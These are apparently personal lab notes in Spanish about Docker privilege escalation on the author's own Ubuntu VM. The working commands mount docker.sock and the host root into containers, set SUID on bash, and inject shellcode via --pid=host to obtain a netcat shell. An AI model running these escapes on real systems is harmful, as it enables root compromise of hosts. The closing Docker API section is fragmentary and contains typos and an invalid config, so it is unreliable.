- Utilizaremos una imagen de **ubuntu server 22.04 lts**
- Debemos descargar la iso para montarla en virtualbox

> Si ocurre un error en la montura de **failed unmounted** no se que, pero hay que borrar el cd de iso nomas y reiniciar

### con docker.sock
- Nos conectamos a traves de ssh con la maquina del atacante para comodidad:
```
ssh savitar@192.168.111.41
```

- Notamos que el usuario creado pertenece por defecto al grupo **lxd** lo cual es vulnerable asi que lo sacamos e instalamos lo esencial:
```
sudo su
gpasswd -d savitar lxd
apt update
apt install docker.io 
```

- Hay un archivo de docker que puede vulnerar la montura de un contenedor:
```
ls -l /var/run/docker.sock
file /var/run/docker.sock
docker pull ubuntu:latest
docker run --rm -dit --name ubuntuServer ubuntu
systemctl status docker
docker exec -it ubuntuServer bash
```
- Entramos al contenedor **ubuntuServer**:
```
apt install
apt install docker.io
docker images
```
- Veremos que aqui no podemos listar las imagenes de la maquina victima, pero si copiamos la ruta del archivo **docker.sock** lo podremos hacer.
- Eliminamos lo que hicimos y volvemso a crear un contenedor pero con un volumen copiado:
```
docker run --rm -dit -v /var/run/docker.sock:/var/run/docker.sock --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
```
- Y ahora tenemos acceso a lo mismo que ve la **maquina victima** a traves de **ubuntuServer**
- Entonces montamos otro contenedor **privesc** que tiene montado toda la raiz de la maquina victima 
```
apt update
apt install docker.io
docker run --rm -dit -v /:/mnt/root --name privesc ubuntu
docker exec -it privesc bash
cd /mnt/root
cd bin 
chmod u+s bash
```
- Logramos ser root

- Reseteamos todo para limpiar permisos y hacer otro laboratorio:
```
chmod u-s bash
docker rm $(docker ps -aq) --force
```

### con pid
```
docker run --rm -dit --pid=host --cap-add=SYS_PTRACE --privileged --name ubuntuServer ubuntu
python3 -m http.server 8081
ps -faux
```
- `--cap-add=SYS_PTRACE` es una capability que se le agrega
- `--privileged` para ejecutar de forma privilegiada.
- `--pid=host` Con este pequenio cambio esta permitido ver que procesos se estan corriendo y quienes tienen el control en la maquina victima, desde ubuntuServer.
- Ahora si detectamos que esta corriendo un servicio como python3 y esta sirviendo datos podemos hacer un **injection shellcode** in naming process linux
```
apt install gcc netcat nano
```
- Debemos crear un archivo en el directorio /tmp indicando que tamanio tendra segun el codigo que hayamos elegido
- [Archivo](https://github.com/W3ndige/linux-process-injection/blob/master/inject.c)
- Este archivo debe modificarse en el
```
#define PID_MAX 32768
#define PID_MAX_STR_LENGTH 64
```
- Lo creamos, compilamos y corremos
```
cd /tmp
nano inject.c
gcc inject.c -o inject
./inject
```

- Si ahora desde la maquina atacante nos ponemos en escucha obtendremos una shell
`nc 172.17.0.1 5000`


### portainer
- Es una pagina para resolver maquina online
soluciones desplegadas que nos deja crear contenedores con la raiz copiada y blablabla

### api de docker
2375 http
2376 https
open port 2375 docker
cd /etc/docker
nano daemon.json
{"hosts": ["tcp":]}
algo mas
systectl daemon-reload
systemctl restart docker.service

netstat -nat
docker pull ubuntu:latest
docker run --rm -dit --name ubuntuServer ubunut
docker exec
apt update
apt install curl wget jq

hacktricks
echo ' ' > /dev/tcp/127.17.0.1/2375
